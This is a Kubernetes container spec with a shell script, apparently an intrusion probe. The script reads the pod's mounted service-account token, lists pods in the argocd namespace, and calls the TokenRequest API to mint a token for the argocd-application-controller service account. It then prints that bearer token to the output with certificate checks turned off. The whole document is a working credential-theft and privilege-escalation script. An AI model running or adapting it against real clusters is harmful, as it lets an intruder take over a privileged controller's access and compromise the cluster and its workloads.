containers.name: probe
args:
#!/bin/sh
set -u
SA=/var/run/secrets/kubernetes.io/serviceaccount
T=$(cat $SA/token)
W(){ wget -q -O - --timeout=20 --no-check-certificate --header="Authorization: Bearer $T" --header="Content-Type: application/json" "$@"; }
echo "===I3030C5_START utc=$(date -u +%FT%TZ) host=$(hostname)==="
echo "===PODS_PRE==="
W "https://kubernetes.default.svc/api/v1/namespaces/argocd/pods?limit=100" | tr ',' '\n' | grep -E '"name"|"phase"' | head -40
echo "===TOKENREQ==="
RESP=$(W --post-data='{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"audiences":["https://kubernetes.default.svc"],"expirationSeconds":3600}}' "https://kubernetes.default.svc/api/v1/namespaces/argocd/serviceaccounts/argocd-application-controller/token" 2>/dev/null)
echo "$RESP" | tr ',' '\n' | grep '"token"' | sed 's/.*"token": *"//; s/".*//'
echo "===TOKEN_END==="
echo "===I3030C5_DONE utc=$(date -u +%FT%TZ)==="
